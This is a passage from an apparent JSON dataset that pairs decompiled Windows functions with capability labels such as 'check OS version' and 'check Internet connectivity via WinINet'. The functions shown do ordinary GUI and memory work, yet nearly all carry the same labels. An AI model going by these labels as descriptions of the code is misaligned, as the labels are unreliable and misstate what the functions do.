var_4h, 0);\n                            pcVar7 = 0x200;\n                            if (((0x200 < pcVar8) || ((arg_8h[3] & 8) == 0)) || ((arg_8h[3] & 0x400) != 0)) {\n                                pcVar7 = arg_8h[6];\n                            }\n                            uVar3 = *(iVar10 + 4 + *piVar1) & 4;\n                            arg_8h = pcVar7;\n                        }\n                        pcVar8 = arg_8h;\n                        if (uVar3 != 0) {\n                            pcVar8 = arg_8h + 1;\n                        }\n                    }\n                    arg_8h = pcVar8;\n                    var_4h = var_4h - arg_8h;\n                }\n            }\n            var_8h = var_8h + var_4h;\n        }\n    }\n    return var_8h;\n}\n",
        "token_count": 1029
    },
    "00429a58": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00429a58(int32_t arg_8h, uint arg_ch, uint arg_10h, int32_t arg_14h)\n\n{\n    uint32_t uVar1;\n    uint *puVar2;\n    int64_t iVar3;\n    int64_t iVar4;\n    \n    iVar4 = CONCAT44(arg_10h, arg_ch);\n    if (((*(arg_8h + 0xc) & 0x83) == 0) || (((arg_14h != 0 && (arg_14h != 1)) && (arg_14h != 2)))) {\n        puVar2 = fcn.0041a92a();\n        *puVar2 = 0x16;\n    }\n    else {\n        *(arg_8h + 0xc) = *(arg_8h + 0xc) & 0xffffffef;\n        if (arg_14h == 1) {\n            iVar3 = fcn.0042971a(arg_8h);\n            iVar4 = iVar3 + iVar4;\n            arg_14h = 0;\n        }\n        arg_10h = iVar4 >> 0x20;\n        arg_ch = iVar4;\n        fcn.00421c50(arg_8h);\n        uVar1 = *(arg_8h + 0xc);\n        if (uVar1 < '\\0') {\n            *(arg_8h + 0xc) = uVar1 & 0xfffffffc;\n        }\n        else if ((((uVar1 & 1) != 0) && ((uVar1 & 8) != 0)) && ((uVar1 & 0x400) == 0)) {\n            *(arg_8h + 0x18) = 0x200;\n        }\n        iVar4 = fcn.00424fb1(*(arg_8h + 0x10), arg_ch, arg_10h, arg_14h);\n        if (iVar4 != -1) {\n            return 0;\n        }\n    }\n    return 0xffffffff;\n}\n",
        "token_count": 450
    },
    "00429ccf": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n// WARNING: Variable defined which should be unmapped: var_4h\n\nuint __cdecl fcn.00429ccf(uint arg_8h)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    int32_t iVar3;\n    uint uVar4;\n    int32_t unaff_EBP;\n    uint *in_FS_OFFSET;\n    uint var_ch;\n    uint var_4h;\n    \n    fcn.00419340();\n    iVar1 = fcn.0043883e();\n    if ((*(iVar1 + 0x24) == 0) && (*(unaff_EBP + 8) != 0)) {\n        uVar2 = fcn.0042f7f2(0x433696);\n        iVar3 = fcn.0042f804(0x60);\n        *(unaff_EBP + 8) = iVar3;\n        *(unaff_EBP + -4) = 0;\n        if (iVar3 == 0) {\n            uVar4 = 0;\n        }\n        else {\n            uVar4 = fcn.00430f07(0x4401f0, 0x4388ea, 0x438887, 4, 1);\n        }\n        *(unaff_EBP + -4) = 0xffffffff;\n        *(iVar1 + 0x24) = uVar4;\n        fcn.0042f7f2(uVar2);\n    }\n    uVar2 = *(iVar1 + 0x24);\n    *in_FS_OFFSET = *(unaff_EBP + -0xc);\n    return uVar2;\n}\n",
        "token_count": 365
    },
    "00429d99": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint __fastcall fcn.00429d99(code **param_1)\n\n{\n    uint uVar1;\n    \n    *param_1 = vtable.CImageList.0;\n    if (param_1[1] == NULL) {\n        return 0;\n    }\n    uVar1 = fcn.00429d4b();\n    uVar1 = (*_sym.imp.COMCTL32.dll_ImageList_Destroy)(uVar1);\n    return uVar1;\n}\n",
        "token_count": 101
    },
    "0042a2b4": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0042a2b4(int32_t param_1)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    int32_t iVar3;\n    uint unaff_ESI;\n    uint uStack8;\n    \n    if (*(param_1 + 0x10) == 0) {\n        uStack8 = 0xc;\n        iVar1 = fcn.0042a3b6(param_1 + 0x14, *(param_1 + 0x18));\n        iVar3 = *(param_1 + 0x18);\n        puVar2 = iVar1 + -8 + iVar3 * 0xc;\n        if (-1 < iVar3 + -1) {\n            do {\n                *puVar2 = *(param_1 + 0x10);\n                *(param_1 + 0x10) = puVar2;\n                puVar2 = puVar2 + -3;\n                iVar3 = iVar3 + -1;\n            } while (iVar3 != 0);\n        }\n    }\n    puVar2 = *(param_1 + 0x10);\n    *(param_1 + 0x10) = *puVar2;\n    puVar2[1] = uStack8;\n    *puVar2 = unaff_ESI;\n    *(param_1 + 0xc) = *(param_1 + 0xc) + 1;\n    puVar2[2] = 0;\n    return;\n}\n",
        "token_count": 323
    },
    "0042a3b6": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid fcn.0042a3b6(uint *param_1, int32_t param_2, int32_t param_3)\n\n{\n    code *pcVar1;\n    uint *puVar2;\n    \n    if ((param_2 != 0) && (param_3 != 0)) {\n        puVar2 = fcn.0042f804(param_2 * param_3 + 4);\n        *puVar2 = *param_1;\n        *param_1 = puVar2;\n        return;\n    }\n    fcn.00429be4();\n    pcVar1 = swi(3);\n    (*pcVar1)();\n    return;\n}\n",
        "token_count": 145
    },
    "0042a5c2": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.0042a5c2(int32_t param_1, int32_t param_2, int32_t param_3)\n\n{\n    uint uVar1;\n    \n    if (param_2 == 0) {\n        param_2 = 0x11;\n    }\n    if (*(param_1 + 4) != 0) {\n        fcn.0042f834(*(param_1 + 4));\n        *(param_1 + 4) = 0;\n    }\n    if (param_3 != 0) {\n        uVar1 = fcn.0042f804(param_2 << 2);\n        *(param_1 + 4) = uVar1;\n        fcn.004192e0(uVar1, 0, param_2 << 2);\n    }\n    *(param_1 + 8) = param_2;\n    return;\n}\n",
        "token_count": 198
    },
    "0042a7b7": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0042a7b7(int32_t param_1)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    uint *puVar3;\n    int32_t iVar4;\n    \n    if (*(param_1 + 0x10) == 0) {\n        iVar2 = fcn.0042a3b6(param_1 + 0x14, *(param_1 + 0x18), 0xc);\n        iVar4 = *(param_1 + 0x18);\n        puVar3 = iVar2 + -8 + iVar4 * 0xc;\n        if (-1 < iVar4 + -1) {\n            do {\n                *puVar3 = *(param_1 + 0x10);\n                *(param_1 + 0x10) = puVar3;\n                puVar3 = puVar3 + -3;\n                iVar4 = iVar4 + -1;\n            } while (iVar4 != 0);\n        }\n    }\n    puVar3 = *(param_1 + 0x10);\n    uVar1 = *puVar3;\n    *(param_1 + 0xc) = *(param_1 + 0xc) + 1;\n    *(param_1 + 0x10) = uVar1;\n    puVar3[1] = 0;\n    puVar3[2] = 0;\n    return;\n}\n",
        "token_count": 308
    },
    "0042a8c2": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint * __fastcall fcn.0042a8c2(int32_t param_1)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    uint *puVar3;\n    int32_t iVar4;\n    \n    if (*(param_1 + 0x10) == 0) {\n        iVar2 = fcn.0042a3b6(param_1 + 0x14, *(param_1 + 0x18), 0x10);\n        iVar4 = *(param_1 + 0x18);\n        puVar3 = iVar2 + -0xc + iVar4 * 0x10;\n        if (-1 < iVar4 + -1) {\n            do {\n                *puVar3 = *(param_1 + 0x10);\n                *(param_1 + 0x10) = puVar3;\n                puVar3 = puVar3 + -4;\n                iVar4 = iVar4 + -1;\n            } while (iVar4 != 0);\n        }\n    }\n    puVar3 = *(param_1 + 0x10);\n    uVar1 = *puVar3;\n    *(param_1 + 0xc) = *(param_1 + 0xc) + 1;\n    *(param_1 + 0x10) = uVar1;\n    if (puVar3 != 0xfffffff8) {\n        fcn.004020b0();\n    }\n    puVar3[3] = 0;\n    return puVar3;\n}\n",
        "token_count": 329
    },
    "0042aade": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid fcn.0042aade(void)\n\n{\n    code **extraout_ECX;\n    int32_t unaff_EBP;\n    uint *in_FS_OFFSET;\n    uint var_10h;\n    uint var_ch;\n    uint var_4h;\n    \n    fcn.00419340();\n    *(unaff_EBP + -0x10) = extraout_ECX;\n    *extraout_ECX = vtable.CDialog.0;\n    *(unaff_EBP + -4) = 0;\n    if (extraout_ECX[7] != NULL) {\n        fcn.0042cd57();\n    }\n    *(unaff_EBP + -4) = 0xffffffff;\n    fcn.0042d346();\n    *in_FS_OFFSET = *(unaff_EBP + -0xc);\n    return;\n}\n",
        "token_count": 195
    },
    "0042b211": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_20h\n// WARNING: Variable defined which should be unmapped: var_1ch\n// WARNING: Variable defined which should be unmapped: hResData\n// WARNING: Variable defined which should be unmapped: hWnd\n// WARNING: Variable defined which should be unmapped: var_ch\n// WARNING: Variable defined which should be unmapped: var_4h\n// WARNING: Variable defined which should be unmapped: var_10h\n\nint32_t fcn.0042b211(uint param_1, uint param_2, uint param_3, uint param_4, uint param_5, uint param_6)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    int32_t noname_0;\n    uint noname_1;\n    uint32_t uVar3;\n    int32_t *extraout_ECX;\n    uint unaff_EBX;\n    int32_t unaff_EBP;\n    uint unaff_ESI;\n    uint unaff_EDI;\n    uint uVar4;\n    uint *in_FS_OFFSET;\n    uint unaff_retaddr;\n    uint var_10h;\n    int32_t *noname_4;\n    uint var_20h;\n    uint var_1ch;\n    uint hResData;\n    uint hWnd;\n    uint in_stack_ffffffec;\n    uint var_ch;\n    uint in_stack_fffffff4;\n    uint var_4h;\n    uint noname_13;\n    \n    noname_13 = 0x42b21b;\n    fcn.00419340();\n    iVar1 = extraout_ECX[0x16];\n    noname_0 = extraout_ECX[0x17];\n    *(unaff_EBP + -0x10) = &fcn.0042b211::var_20h;\n    *(unaff_EBP + -0x1c) = extraout_ECX;\n    *(unaff_EBP + -0x18) = iVar1;\n    var_20h = unaff_EDI;\n    var_1ch = unaff_ESI;\n    hResData = unaff_EBX;\n    iVar1 = fcn.00438818();\n    uVar4 = *(iVar1 + 0xc);\n    if (extraout_ECX[0x15] != 0) {\n        iVar1 = fcn.00438818();\n        uVar4 = *(iVar1 + 0xc);\n        uVar2 = (*_sym.imp.KERNEL32.dll_FindResourceA)(uVar4, extraout_ECX[0x15], 5);\n        uVar2 = (*_sym.imp.KERNEL32.dll_LoadResource)(uVar4, uVar2);\n        *(unaff_EBP + -0x18) = uVar2;\n    }\n    if (*(unaff_EBP + -0x18) != 0) {\n        noname_0 = (*_sym.imp.KERNEL32.dll_LockResource)(*(unaff_EBP + -0x18));\n    }\n    if (noname_0 == 0) {\n        iVar1 = -1;\n    }\n    else {\n        uVar2 = fcn.0042ad51();\n        *(unaff_EBP + -0x14) = uVar2;\n        fcn.0042cba9();\n        *(unaff_EBP + -0x20) = 0;\n        if (*(unaff_EBP + -0x14) != 0) {\n            iVar1 = (*_sym.imp.USER32.dll_GetDesktopWindow)();\n            if (*(unaff_EBP + -0x14) != iVar1) {\n                iVar1 = (*_sym.imp.USER32.dll_IsWindowEnabled)(*(unaff_EBP + -0x14));\n                if (iVar1 != 0) {\n                    (*_sym.imp.USER32.dll_EnableWindow)(*(unaff_EBP + -0x14), 0);\n                    *(unaff_EBP + -0x20) = 1;\n                }\n            }\n        }\n        *(unaff_EBP + -4) = 0;\n        noname_4 = extraout_ECX;\n        fcn.0042df81();\n        uVar2 = *(unaff_EBP + -0x14);\n        noname_1 = fcn.0042cb01();\n        iVar1 = fcn.0042b004(noname_0, noname_1, uVar4, uVar2, noname_4, var_20h, var_1ch, hResData, hWnd, \n                             in_stack_ffffffec, var_ch, in_stack_fffffff4, var_4h, noname_13, unaff_retaddr, param_1, \n                             param_2, param_3, var_10h, param_5, param_6);\n        if (iVar1 != 0) {\n            if ((*(extraout_ECX + 0xe) & 0x10) != 0) {\n                uVar4 = 4;\n                uVar3 = fcn.0042ebfd();\n                if ((uVar3 & 0x100) != 0) {\n                    uVar4 = 5;\n                }\n                fcn.0042c5a5(uVar4);\n            }\n            if (extraout_ECX[7] != 0) {\n                fcn.0042ee21(0, 0, 0, 0, 0, 0x97);\n            }\n        }\n        *(unaff_EBP + -4) = 0xffffffff;\n        if (*(unaff_EBP + -0x20) != 0) {\n            (*_sym.imp.USER32.dll_EnableWindow)(*(unaff_EBP + -0x14), 1);\n        }\n        if (*(unaff_EBP + -0x14) != 0) {\n            iVar1 = (*_sym.imp.USER32.dll_GetActiveWindow)();\n            if (iVar1 == extraout_ECX[7]) {\n                (*_sym.imp.USER32.dll_SetActiveWindow)(*(unaff_EBP + -0x14));\n            }\n        }\n        (**(*extraout_ECX + 0x60))();\n        fcn.0042ad8b();\n        if (extraout_ECX[0x15] != 0) {\n            (*_sym.imp.KERNEL32.dll_FreeResource)(*(unaff_EBP + -0x18));\n        }\n        iVar1 = extraout_ECX[0x10];\n    }\n    *in_FS_OFFSET = *(unaff_EBP + -0xc);\n    return iVar1;\n}\n",
        "token_count": 1423
    },
    "0042b61a": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: lpWndClass\n\nuint __cdecl\nfcn.0042b61a(uint noname_0, uint noname_1, uint noname_2, uint noname_3, uint noname_4, uint noname_5, uint noname_6, \n            uint noname_7, uint noname_8, uint noname_9, uint noname_10, uint noname_11, uint noname_12, uint noname_13\n            , uint noname_14, uint noname_15, uint noname_16, uint arg_8h)\n\n{\n    int32_t iVar1;\n    code *pcVar2;\n    int16_t iVar3;\n    int32_t iVar4;\n    uint uVar5;\n    int32_t iVar6;\n    uint uVar7;\n    int32_t unaff_EBP;\n    uint *in_FS_OFFSET;\n    uint var_8h;\n    uint var_10h;\n    uint lpWndClass;\n    uint var_18h;\n    uint var_14h;\n    uint var_ch;\n    uint var_4h;\n    \n    fcn.00419340();\n    iVar1 = *(unaff_EBP + 8);\n    *(unaff_EBP + -0x10) = &lpWndClass;\n    iVar4 = (*_sym.imp.USER32.dll_GetClassInfoA)(*(iVar1 + 0x10), *(iVar1 + 0x24), unaff_EBP + -0x40);\n    if (iVar4 != 0) {\n        uVar5 = 1;\n        goto code_r0x0042b6fa;\n    }\n    iVar3 = (*_sym.imp.USER32.dll_RegisterClassA)(iVar1);\n    if (iVar3 == 0) {\ncode_r0x0042b69f:\n        uVar5 = 0;\n    }\n    else {\n        *(unaff_EBP + -0x18) = 1;\n        iVar4 = fcn.00438818();\n        if (*(iVar4 + 0x14) != '\\0') {\n            fcn.00439038(1);\n            *(unaff_EBP + -4) = 0;\n            iVar4 = fcn.00438818();\n            pcVar2 = _sym.imp.KERNEL32.dll_lstrlenA;\n            *(unaff_EBP + -0x14) = iVar4 + 0x34;\n            iVar4 = (*pcVar2)(iVar4 + 0x34);\n            iVar6 = (*pcVar2)(*(iVar1 + 0x24));\n            if (0xfff < iVar4 + 2 + iVar6) goto code_r0x0042b69f;\n            uVar7 = (*pcVar2)(*(unaff_EBP + -0x14));\n            uVar5 = *(iVar1 + 0x24);\n            *(unaff_EBP + 8) = uVar7;\n            iVar4 = (*pcVar2)(uVar5);\n            pcVar2 = _sym.imp.KERNEL32.dll_lstrcatA;\n            if (*(unaff_EBP + 8) + 2 + iVar4 < 0x1000) {\n                (*_sym.imp.KERNEL32.dll_lstrcatA)(*(unaff_EBP + -0x14), *(iVar1 + 0x24));\n                *(unaff_EBP + 10) = 10;\n                *(unaff_EBP + 0xb) = 0;\n                (*pcVar2)(*(unaff_EBP + -0x14), unaff_EBP + 10);\n            }\n            else {\n                uVar5 = *(iVar1 + 0x10);\n                *(unaff_EBP + -0x18) = 0;\n                (*_sym.imp.USER32.dll_UnregisterClassA)(*(iVar1 + 0x24), uVar5);\n            }\n            *(unaff_EBP + -4) = 0xffffffff;\n            fcn.0043909b(1);\n        }\n        uVar5 = *(unaff_EBP + -0x18);\n    }\ncode_r0x0042b6fa:\n    *in_FS_OFFSET = *(unaff_EBP + -0xc);\n    return uVar5;\n}\n",
        "token_count": 927
    },
    "0042b752": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nint32_t * __cdecl fcn.0042b752(int32_t *arg_8h, int32_t arg_ch, int32_t arg_10h, uint32_t arg_14h)\n\n{\n    while( true ) {\n        if (arg_8h[4] == 0) {\n            return NULL;\n        }\n        if ((((arg_ch == *arg_8h) && (arg_10h == arg_8h[1])) && (arg_8h[2] <= arg_14h)) &&\n           (arg_14h < arg_8h[3] || arg_14h == arg_8h[3])) break;\n        arg_8h = arg_8h + 6;\n    }\n    return arg_8h;\n}\n",
        "token_count": 168
    },
    "0042b805": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0042b805(int32_t *arg_8h, uint hWnd, int32_t *lprc2)\n\n{\n    code *pcVar1;\n    uint uVar2;\n    int32_t iVar3;\n    uint lpRect;\n    uint var_8h;\n    \n    uVar2 = (*_sym.imp.USER32.dll_GetParent)(hWnd);\n    if ((arg_8h == NULL) || (*arg_8h != 0)) {\n        (*_sym.imp.USER32.dll_GetWindowRect)(hWnd, &lpRect);\n        pcVar1 = _sym.imp.USER32.dll_ScreenToClient;\n        (*_sym.imp.USER32.dll_ScreenToClient)(uVar2, &lpRect);\n        (*pcVar1)(uVar2, &var_8h);\n        iVar3 = (*_sym.imp.USER32.dll_EqualRect)(&lpRect, lprc2);\n        if (iVar3 == 0) {\n            if (arg_8h == NULL) {\n                (*_sym.imp.USER32.dll_SetWindowPos)\n                          (hWnd, 0, *lprc2, lprc2[1], lprc2[2] - *lprc2, lprc2[3] - lprc2[1], 0x14);\n            }\n            else {\n                iVar3 = (*_sym.imp.USER32.dll_DeferWindowPos)(*arg_8h);\n                *arg_8h = iVar3;\n            }\n        }\n    }\n    return;\n}\n",
        "token_count": 335
    },
    "0042ca85": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n// WARNING: Variable defined which should be unmapped: var_4h\n\nuint __cdecl fcn.0042ca85(uint arg_8h)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    int32_t iVar3;\n    uint uVar4;\n    int32_t unaff_EBP;\n    uint *in_FS_OFFSET;\n    uint var_ch;\n    uint var_4h;\n    \n    fcn.00419340();\n    iVar1 = fcn.0043883e();\n    if ((*(iVar1 + 0x14) == 0) && (*(unaff_EBP + 8) != 0)) {\n        uVar2 = fcn.0042f7f2(0x433696);\n        iVar3 = fcn.0042f804(0x60);\n        *(unaff_EBP + 8) = iVar3;\n        *(unaff_EBP + -4) = 0;\n        if (iVar3 == 0) {\n            uVar4 = 0;\n        }\n        else {\n            uVar4 = fcn.00430f07(0x43e844, 0x437210, 0x438887, 0x1c, 1);\n        }\n        *(unaff_EBP + -4) = 0xffffffff;\n        *(iVar1 + 0x14) = uVar4;\n        fcn.0042f7f2(uVar2);\n    }\n    uVar2 = *(iVar1 + 0x14);\n    *in_FS_OFFSET = *(unaff_EBP + -0xc);\n    return uVar2;\n}\n",
        "token_count": 366
    },
    "0042cba9": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint fcn.0042cba9(void)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    \n    iVar1 = fcn.00438ea6(0x4371aa);\n    iVar2 = fcn.00438818();\n    if ((*(iVar2 + 0x14) != '\\0') && (*(iVar1 + 0x28) != 0)) {\n        (*_sym.imp.USER32.dll_UnhookWindowsHookEx)(*(iVar1 + 0x28));\n        *(iVar1 + 0x28) = 0;\n    }\n    if (*(iVar1 + 0x14) != 0) {\n        *(iVar1 + 0x14) = 0;\n        return 0;\n    }\n    return 1;\n}\n",
        "token_count": 169
    },
    "0042cc46": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0042cc46(int32_t *param_1)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t *piVar4;\n    uint var_30h;\n    uint var_2ch;\n    int32_t var_28h;\n    int32_t var_24h;\n    \n    iVar2 = fcn.0042fa75();\n    if (iVar2 == 0) goto code_r0x0042cc91;\n    if (*(iVar2 + 0x1c) == param_1) {\n        iVar3 = fcn.00438818();\n        if (*(iVar3 + 0x14) == '\\0') {\n            iVar3 = fcn.00438818();\n            if (iVar2 == *(iVar3 + 4)) {\n                iVar3 = fcn.00436f8c();\n                if (iVar3 == 0) goto code_r0x0042cc86;\n            }\n            fcn.0043b077(0);\n        }\ncode_r0x0042cc86:\n        *(iVar2 + 0x1c) = 0;\n    }\n    if (*(iVar2 + 0x20) == param_1) {\n        *(iVar2 + 0x20) = 0;\n    }\ncode_r0x0042cc91:\n    if (param_1[0x11] != NULL) {\n        (**(*param_1[0x11] + 0x50))();\n        param_1[0x11] = 0;\n    }\n    if (param_1[0x12] != NULL) {\n        (**(*param_1[0x12] + 4))(1);\n    }\n    param_1[0x12] = 0;\n    if ((*(param_1 + 0xe) & 1) != 0) {\n        iVar2 = fcn.0043883e();\n        iVar2 = *(iVar2 + 0x3c);\n        if ((iVar2 != 0) && (*(iVar2 + 0x1c) != 0)) {\n            fcn.004192e0(&var_30h, 0, 0x30);\n            var_28h = param_1[7];\n            var_30h = 0x28;\n            var_2ch = 1;\n            var_24h = var_28h;\n            (*_sym.imp.USER32.dll_SendMessageA)(*(iVar2 + 0x1c), 0x405, 0, &var_30h);\n        }\n    }\n    pcVar1 = _sym.imp.USER32.dll_GetWindowLongA;\n    iVar2 = (*_sym.imp.USER32.dll_GetWindowLongA)(param_1[7], 0xfffffffc);\n    fcn.0042ca5e();\n    iVar3 = (*pcVar1)(param_1[7], 0xfffffffc);\n    if (iVar3 == iVar2) {\n        piVar4 = (**(*param_1 + 0xf0))();\n        if (*piVar4 != 0) {\n            (*_sym.imp.USER32.dll_SetWindowLongA)(param_1[7], 0xfffffffc, *piVar4);\n        }\n    }\n    fcn.0042cb7b();\n    (**(*param_1 + 0x114))();\n    return;\n}\n",
        "token_count": 742
    },
    "0042ce68": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl\nfcn.0042ce68(uint32_t arg_8h, uint32_t arg_ch, uint32_t arg_10h, uint32_t arg_14h, int32_t *lprcDst, int32_t *arg_1ch, \n            int32_t arg_20h)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    uint32_t uVar4;\n    int32_t iVar5;\n    int32_t *piVar6;\n    int32_t in_ECX;\n    int32_t hWinPosInfo;\n    int32_t lprcSrc;\n    int32_t var_1ch;\n    int32_t var_18h;\n    int32_t var_14h;\n    int32_t var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    var_4h = 0;\n    var_8h = arg_20h;\n    var_ch = 0;\n    var_10h = 0;\n    if (arg_1ch == NULL) {\n        (*_sym.imp.USER32.dll_GetClientRect)(*(in_ECX + 0x1c), &lprcSrc);\n    }\n    else {\n        lprcSrc = *arg_1ch;\n        var_1ch = arg_1ch[1];\n        var_18h = arg_1ch[2];\n        var_14h = arg_1ch[3];\n    }\n    uVar2 = arg_14h & 0xffff7fff;\n    if (uVar2 == 1) {\n        hWinPosInfo = 0;\n    }\n    else {\n        hWinPosInfo = (*_sym.imp.USER32.dll_BeginDeferWindowPos)(8);\n    }\n    for (iVar3 = (*_sym.imp.USER32.dll_GetTopWindow)(*(in_ECX + 0x1c)); iVar3 != 0;\n        iVar3 = (*_sym.imp.USER32.dll_GetWindow)(iVar3, 2)) {\n        uVar4 = (*_sym.imp.USER32.dll_GetDlgCtrlID)(iVar3);\n        uVar4 = uVar4 & 0xffff;\n        iVar5 = fcn.0042cb28(iVar3);\n        iVar1 = iVar3;\n        if ((((uVar4 != arg_10h) && (iVar1 = var_4h,  arg_8h <= uVar4)) && (uVar4 <= arg_ch)) && (iVar5 != 0)) {\n            (*_sym.imp.USER32.dll_SendMessageA)(iVar3, 0x361, 0, &hWinPosInfo);\n            iVar1 = var_4h;\n        }\n        var_4h = iVar1;\n    }\n    if (uVar2 == 1) {\n        if (arg_20h == 0) {\n            lprcDst[2] = var_10h;\n            lprcDst[1] = 0;\n            *lprcDst = 0;\n            lprcDst[3] = var_ch;\n        }\n        else {\n            (*_sym.imp.USER32.dll_CopyRect)(lprcDst, &lprcSrc);\n        }\n    }\n    else {\n        if ((arg_10h != 0) && (var_4h != 0)) {\n            piVar6 = fcn.0042cb01(var_4h);\n            if (uVar2 == 2) {\n                lprcSrc = lprcSrc + *lprcDst;\n                var_1ch = var_1ch + lprcDst[1];\n                var_18h = var_18h - lprcDst[2];\n                var_14h = var_14h - lprcDst[3];\n            }\n            if ((arg_14h & 0x8000) == 0) {\n                (**(*piVar6 + 0x68))(&lprcSrc, 0);\n                fcn.0042b805(&hWinPosInfo, var_4h, &lprcSrc);\n            }\n        }\n        if (hWinPosInfo != 0) {\n            (*_sym.imp.USER32.dll_EndDeferWindowPos)(hWinPosInfo);\n        }\n    }\n    return;\n}\n",
        "token_count": 948
    },
    "0042d0ac": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
